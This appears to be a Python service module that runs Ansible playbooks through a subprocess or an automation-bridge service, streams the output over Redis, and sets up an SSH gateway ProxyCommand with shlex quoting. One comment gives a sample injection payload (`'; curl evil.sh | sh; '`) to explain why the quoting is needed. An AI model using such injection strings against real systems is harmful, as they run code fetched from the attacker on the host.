"""Job execution — direct Ansible subprocess + Redis pub/sub streaming."""

from __future__ import annotations

import asyncio
import datetime
import json
import os
import shlex
from typing import Any

import structlog

from ..config import get_settings
from ..database import AsyncSessionLocal
from ..models.domain import Job

log = structlog.get_logger(__name__)
settings = get_settings()

_POLL_INTERVAL = 1.0
_MAX_POLL_SECONDS = 3600


# ── Public entry points ───────────────────────────────────────────────────────


async def run_job_async(job_id: str) -> None:
    """Try automation-bridge first; fall back to direct execution."""
    try:
        await _run_via_automation_bridge(job_id)
    except Exception:
        log.info("ab_unavailable_using_direct", job_id=job_id)
        await run_job_direct(job_id)


async def run_job_direct(job_id: str) -> None:
    """Execute Ansible playbook directly via subprocess (no automation-bridge needed)."""
    job_start = datetime.datetime.now()  # monotonic reference for duration

    async with AsyncSessionLocal() as db:
        j = await db.get(Job, job_id)
        if not j:
            log.error("run_job_missing", job_id=job_id)
            return
        j.status = "running"
        j.started_at = datetime.datetime.utcnow()
        await db.commit()

    output_lines: list[str] = []
    yaml_path: str | None = None

    try:
        yaml_content = await _get_yaml_content(job_id)
        if not yaml_content:
            raise ValueError("No YAML content for job")

        os.makedirs("/playbooks/studio", exist_ok=True)
        yaml_path = f"/playbooks/studio/{job_id}.yml"
        with open(yaml_path, "w") as f:
            f.write(yaml_content)

        inventory = await _get_inventory(job_id)
        extra_vars = await _get_extra_vars(job_id)

        cmd = _build_ansible_cmd(yaml_path, inventory, extra_vars)
        log.info("ansible_exec_start", job_id=job_id, cmd=" ".join(cmd))

        output_lines = await _stream_subprocess(job_id, cmd)

        exit_code = 0
        for line in reversed(output_lines):
            if "FAILED" in line or ("failed=" in line and "failed=0" not in line):
                exit_code = 2
                break
            if "unreachable=" in line and "unreachable=0" not in line:
                exit_code = 3
                break

        duration = (datetime.datetime.now() - job_start).total_seconds()
        await _finish_job(job_id, output_lines, exit_code, duration_seconds=duration)
        await _publish(
            job_id,
            {
                "type": "done",
                "status": "success" if exit_code == 0 else "failed",
                "exit_code": exit_code,
            },
        )

    except Exception as exc:
        log.error("direct_exec_error", job_id=job_id, error=str(exc))
        output_lines.append(f"[ERROR] {exc}")
        duration = (datetime.datetime.now() - job_start).total_seconds()
        await _finish_job(
            job_id, output_lines, exit_code=1, status="failed", duration_seconds=duration
        )
        await _publish(job_id, {"type": "error", "line": str(exc)})

    finally:
        if yaml_path and os.path.exists(yaml_path):
            try:
                os.unlink(yaml_path)
            except OSError:
                pass


async def cancel_job_async(job_id: str, ab_job_id: str | None) -> None:
    pass


# ── Automation-bridge path ────────────────────────────────────────────────────


async def _run_via_automation_bridge(job_id: str) -> None:
    import httpx

    async with AsyncSessionLocal() as db:
        j = await db.get(Job, job_id)
        if not j:
            return
        j.status = "running"
        j.started_at = datetime.datetime.now(datetime.UTC).replace(tzinfo=None)
        await db.commit()

    async with httpx.AsyncClient(timeout=5) as client:
        resp = await client.post(
            f"{settings.automation_bridge_url}/run/ansible-inline",
            json={
                "yaml_content": j.yaml_content,
                "inventory_selector": j.inventory_selector or "all",
                "extra_vars": j.extra_vars or {},
                "triggered_by": j.triggered_by,
            },
        )
        resp.raise_for_status()
        ab_job_id = resp.json()["job_id"]

    async with AsyncSessionLocal() as db:
        j = await db.get(Job, job_id)
        if j:
            j.ab_job_id = ab_job_id
            await db.commit()

    await _poll_automation_bridge(job_id, ab_job_id)


async def _poll_automation_bridge(job_id: str, ab_job_id: str) -> None:
    import httpx

    deadline = asyncio.get_event_loop().time() + _MAX_POLL_SECONDS
    seen = 0
    output_lines: list[str] = []

    async with httpx.AsyncClient(timeout=10) as client:
        while asyncio.get_event_loop().time() < deadline:
            await asyncio.sleep(_POLL_INTERVAL)
            try:
                r = await client.get(
                    f"{settings.automation_bridge_url}/run/ansible/jobs/{ab_job_id}"
                )
                r.raise_for_status()
                data = r.json()
            except Exception:
                continue

            new_lines = data.get("output_lines", [])[seen:]
            for line in new_lines:
                output_lines.append(line)
                await _publish(job_id, {"type": "line", "line": line})
            seen += len(new_lines)

            ab_status = data.get("status", "running")
            if ab_status in ("success", "failed", "cancelled"):
                exit_code = data.get("exit_code", 0 if ab_status == "success" else 1)
                await _finish_job(job_id, output_lines, exit_code, ab_status)
                await _publish(
                    job_id, {"type": "done", "status": ab_status, "exit_code": exit_code}
                )
                return


# ── Ansible subprocess ────────────────────────────────────────────────────────


def _build_ansible_cmd(yaml_path: str, inventory: str, extra_vars: dict) -> list[str]:
    cmd = ["ansible-playbook", yaml_path]

    # Inventory handling:
    # - Bare hostname/IP (including "localhost") → add comma to force host-list mode
    # - "all" → use as Ansible pattern with no explicit inventory (uses implicit hosts)
    # - paths with / or spaces → pass as-is (file path or pattern)
    ev = dict(extra_vars)  # copy — don't mutate the caller's dict

    if inventory == "all":
        cmd += ["-i", "localhost,"]  # use implicit localhost with connection=local for "all"
        ev.setdefault("ansible_connection", "local")
    elif "/" not in inventory and " " not in inventory:
        cmd += ["-i", f"{inventory},"]  # single host: hostname, or IP, or localhost
    else:
        cmd += ["-i", inventory]

    # Extract gateway vars before building extra-vars JSON (they become ansible_ssh_common_args)
    gw_host = ev.pop("_gateway_host", None)
    gw_port = ev.pop("_gateway_port", "22")
    gw_user = ev.pop("_gateway_user", None)
    gw_pass = ev.pop("_gateway_password", None)

    if gw_host and gw_user:
        # ProxyCommand is run by ssh through /bin/sh, so these values land in a
        # shell even though the ansible-playbook argv itself is passed as a list
        # to create_subprocess_exec. They come from job extra-vars, i.e. from the
        # request, so every one of them must be quoted or a gateway password like
        # `'; curl evil.sh | sh; '` executes on the runner.
        q_host = shlex.quote(str(gw_host))
        q_user = shlex.quote(str(gw_user))
        q_port = shlex.quote(str(gw_port))

        if gw_pass:
            proxy_cmd = (
                f"sshpass -p {shlex.quote(str(gw_pass))} ssh -W %h:%p "
                f"-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                f"-p {q_port} {q_user}@{q_host}"
            )
        else:
            proxy_cmd = (
                f"ssh -W %h:%p "
                f"-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                f"-p {q_port} {q_user}@{q_host}"
            )
        # Two levels of parsing, so two levels of quoting. Ansible shlex-splits
        # ansible_ssh_common_args before handing it to ssh, so the ProxyCommand
        # value is quoted with shlex.quote rather than wrapped in literal single
        # quotes — the quotes shlex.quote emits above would otherwise terminate a
        # hand-written '...' early and split the command back onto ssh's argv.
        ev["ansible_ssh_common_args"] = (
            f"-o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null "
            f"-o ProxyCommand={shlex.quote(proxy_cmd)}"
        )
        log.info("gateway_proxy_configured", gw_host=gw_host, gw_port=gw_port, gw_user=gw_user)

    if ev:
        cmd += ["--extra-vars", json.dumps(ev)]

    os.environ.setdefault("ANSIBLE_HOST_KEY_CHECKING", "False")

    return cmd


async def _stream_subprocess(job_id: str, cmd: list[str]) -> list[str]:
    output_lines: list[str] = []

    env = os.environ.copy()
    env["ANSIBLE_HOST_KEY_CHECKING"] = "False"
    env["ANSIBLE_FORCE_COLOR"] = "0"
    env["ANSIBLE_STDOUT_CALLBACK"] = "default"
    env.pop("ANSIBLE_CALLBACKS_ENABLED", None)

    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env=env,
    )

    async def read_lines():
        async for raw in proc.stdout:
            line = raw.decode("utf-8", errors="replace").rstrip()
            output_lines.append(line)
            await _publish(job_id, {"type": "line", "line": line})
            log.debug("ansible_line", job_id=job_id, line=line)

    await asyncio.wait_for(read_lines(), timeout=_MAX_POLL_SECONDS)
    await proc.wait()
    return output_lines


# ── Helpers ───────────────────────────────────────────────────────────────────


async def _get_yaml_content(job_id: str) -> str | None:
    async with AsyncSessionLocal() as db:
        j = await db.get(Job, job_id)
        return j.yaml_content if j else None


async def _get_inventory(job_id: str) -> str:
    async with AsyncSessionLocal() as db:
        j = await db.get(Job, job_id)
        return (j.inventory_selector or "all") if j else "all"


async def _get_extra_vars(job_id: str) -> dict:
    async with AsyncSessionLocal() as db:
        j = await db.get(Job, job_id)
        return (j.extra_vars or {}) if j else {}


async def _finish_job(
    job_id: str,
    output_lines: list[str],
    exit_code: int,
    status: str | None = None,
    duration_seconds: float | None = None,
) -> None:
    if status is None:
        status = "success" if exit_code == 0 else "failed"
    async with AsyncSessionLocal() as db:
        j = await db.get(Job, job_id)
        if j:
            j.status = status
            j.exit_code = exit_code
            j.finished_at = datetime.datetime.utcnow()
            # Use the wall-clock duration passed from the caller (avoids timezone DB issues)
            if duration_seconds is not None:
                j.duration_seconds = round(max(0.0, duration_seconds), 1)
            j.output_lines = output_lines[-500:]
            await db.commit()

    if status == "failed":
        await _fire_alerts(job_id, exit_code)


async def _publish(job_id: str, payload: dict[str, Any]) -> None:
    try:
        import redis.asyncio as aioredis

        redis = aioredis.from_url(settings.redis_url, decode_responses=True)
        await redis.publish(f"job_output:{job_id}", json.dumps(payload))
        await redis.aclose()
    except Exception as exc:
        log.debug("redis_publish_skip", job_id=job_id, error=str(exc))


async def _fire_alerts(job_id: str, exit_code: int) -> None:
    try:
        from .alert_evaluator import evaluate_job_event

        await evaluate_job_event(job_id=job_id, exit_code=exit_code)
    except Exception as exc:
        log.debug("alert_eval_skip", job_id=job_id, error=str(exc))
